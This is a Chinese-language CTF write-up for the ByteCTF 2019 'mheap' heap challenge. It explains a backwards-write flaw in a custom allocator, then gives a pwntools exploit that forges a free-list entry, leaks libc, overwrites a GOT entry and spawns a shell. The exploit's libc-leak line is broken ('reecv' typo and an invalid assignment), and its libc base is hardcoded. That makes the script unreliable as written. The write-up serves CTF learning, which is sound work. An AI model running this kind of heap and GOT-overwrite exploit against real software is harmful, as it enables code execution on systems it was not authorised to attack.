[TOC]

# checksec  
```
[*] '/home/dra/ctf/2019_ByteCTF/mheap/mheap'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

这道题没有开启pie 真的是不幸中的万幸

# 程序流程

1. add 索引<= 0xf ，任意大小，但是size = size - size&0xf + 0x10 + 0x10 ,alloc 可以修改一个strange_pointer 指针 
2. show 打印指针上的值
3. free strange_pointer 类似于mani_area.fasbbinY 释放后挂在上面。
4. edit 单纯的edit

# 思路

看了Kirin师傅得exp ， 又学到了。partial relro 可以修改got。

my_read 函数
```
__int64 __fastcall my_read(__int64 a1, signed int len)
{
  __int64 result; // rax
  signed int v3; // [rsp+18h] [rbp-8h]
  int v4; // [rsp+1Ch] [rbp-4h]

  v3 = 0;
  do
  {
    result = (unsigned int)v3;
    if ( v3 >= len )
      break;
    v4 = read(0, (void *)(a1 + v3), len - v3);
    if ( !v4 )
      exit(0);
    v3 += v4;
    result = *(unsigned __int8 *)(v3 - 1LL + a1);
  }
  while ( (_BYTE)result != '\n' );
  return result;
}
```
read = -1 时，可以实现向前写入数据。
```
_QWORD *__fastcall sub_4012D0(int len)
{
  _QWORD *result; // rax
  _QWORD *v2; // [rsp+4h] [rbp-10h]
  _QWORD *i; // [rsp+Ch] [rbp-8h]

  v2 = (_QWORD *)strange_pointer;
  if ( !strange_pointer )
    return 0LL;
  if ( (*(_QWORD *)strange_pointer & 0xFFFFFFFF0LL) == len )// 可修改strange_p ,使其指向其下一个地址
  {
    strange_pointer = *(_QWORD *)(strange_pointer + 8);
    result = v2;
  }
  else
  {
    for ( i = *(_QWORD **)(strange_pointer + 8); i; i = (_QWORD *)i[1] )
    {
      if ( (*i & 0xFFFFFFFF0LL) == len )
      {
        v2[1] = i[1];
        return i;
      }
      v2 = i;
    }
    result = 0LL;
  }
  return result;
}
```
通过向strange_pointer + 8 写入数据可以实现任意地址攻击(满足size 字段)，

# exp
```
from pwn import *

context.log_level = 'debug'

def alloc(idx,size,data):
    p.sendlineafter(": ","1")
    p.sendlineafter(": ",str(idx))
    p.sendlineafter(": ",str(size))
    p.sendafter(": ",data)


def show(idx):
    p.sendlineafter(": ","2")
    p.sendlineafter(": ",str(idx))


def free(idx):
    p.sendlineafter(": ","3")
    p.sendlineafter(": ",str(idx))


def edit(idx,data):
    p.sendlineafter(": ","4")
    p.sendlineafter(": ",str(idx))
    p.send(data)


p = process('./mheap')
alloc(0,0xf90,"d00m\n")
alloc(1,1,"1")
free(1)
padding = p64(0x4040e3)*13+"aaaaaaa\n"
alloc(2,0x50,padding)
alloc(0,0x10,"aaaa\n")
alloc(0,0x10,"aaaaa"+p64(0x404050)+"\n")
show(3)
libc = u64(p.reecv(6)+"\x00\x00")=0x40680
edit(3,p64(0x00007ffff79e4000+0x4f440)+"\n")
p.sendline("/bin/sh")
#gdb.attach(p)
p.interactive()

```

